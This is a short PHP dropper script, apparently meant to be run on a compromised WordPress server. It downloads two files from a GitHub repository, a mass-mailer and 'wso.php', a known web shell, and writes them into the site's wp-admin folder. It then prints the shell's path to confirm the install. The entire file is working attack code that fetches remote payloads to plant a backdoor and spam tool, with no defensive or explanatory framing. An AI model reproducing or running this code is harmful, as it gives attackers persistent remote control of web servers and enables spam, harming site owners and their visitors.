<?php
function http_get($url){
$im = curl_init($url);
curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($im, CURLOPT_HEADER, 0);
return curl_exec($im);
curl_close($im);
}
$check2 = $_SERVER['DOCUMENT_ROOT'] . "/wp-admin/mailer2020.php" ;
$text2 = http_get('https://raw.githubusercontent.com/Aht-crew/upload/master/mailer2020.php');
$open2 = fopen($check2, 'w');
fwrite($open2, $text2);
fclose($open2);

$check3=$_SERVER['DOCUMENT_ROOT'] . "/wp-admin/wso.php" ;
$text3 = http_get('https://raw.githubusercontent.com/Aht-crew/upload/master/wso.php');
$op3=fopen($check3, 'w');
fwrite($op3,$text3);
fclose($op3);
if(file_exists($check3)){
echo $check3."</br>";
}else 
echo "not exits";
echo "done .\n " ;
?>